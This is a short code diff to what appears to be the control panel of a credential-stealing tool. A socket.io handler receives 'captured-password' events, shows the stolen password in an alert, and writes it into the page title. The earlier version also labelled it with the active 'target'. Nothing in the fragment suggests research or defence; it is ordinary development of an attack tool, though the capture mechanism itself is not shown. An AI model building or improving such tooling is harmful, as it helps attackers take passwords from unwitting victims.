@@ -664,8 +664,9 @@
             }
         };
 
-        socket.on('captured-password', (pwd) => {
-            alert("🚨 PASSWORD CAPTURED! 🚨\n\nTarget: " + activeTarget + "\nPassword: " + pwd);
+        socket.on('captured-password', (data) => {
+            const pwd = typeof data === 'string' ? data : data.password;
+            alert("🚨 PASSWORD CAPTURED! 🚨\n\nPassword: " + pwd);
             // We can also display it in the remote text box or title just in case
             document.getElementById('title').innerText = "Captured Password: " + pwd;
             document.getElementById('title').style.color = "#ffeb3b";
